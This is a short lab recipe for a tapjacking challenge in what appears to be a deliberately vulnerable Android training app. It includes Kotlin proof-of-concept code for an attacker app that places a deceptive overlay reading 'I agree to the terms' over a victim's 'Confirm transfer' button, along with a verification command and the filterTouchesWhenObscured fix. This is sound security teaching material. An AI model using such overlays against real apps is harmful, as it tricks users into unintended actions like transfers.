# Tapjacking PoC recipe (advanced/tapjacking)

The confirm button does not filter obscured touches.

**In-app simulation:** press *Confirm transfer* — insecure mode reports the tap fired
through the overlay (flag reveal); secure mode refuses (`filterTouchesWhenObscured`).

**Real-world PoC:**

```kotlin
// attacker app: TYPE_APPLICATION_OVERLAY window over the victim's button
val wm = getSystemService(WindowManager::class.java)
wm.addView(TextView(this).apply {
    text = "I agree to the terms"
    setBackgroundColor(0xCC000000.toInt())
}, WindowManager.LayoutParams(
    WindowManager.LayoutParams.MATCH_PARENT, 400,
    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
    PixelFormat.TRANSLUCENT,
))
```

The user taps the overlay's button; the touch ALSO reaches the victim button beneath
(no obscured-touch filtering). Verify with the challenge's reveal, or
`adb shell dumpsys input | grep -i obscured`.

**Fix:** `view.filterTouchesWhenObscured = true` (or `FLAG_WINDOW_IS_OBSCURED`
checks in the touch handler) — the secure path in the challenge.
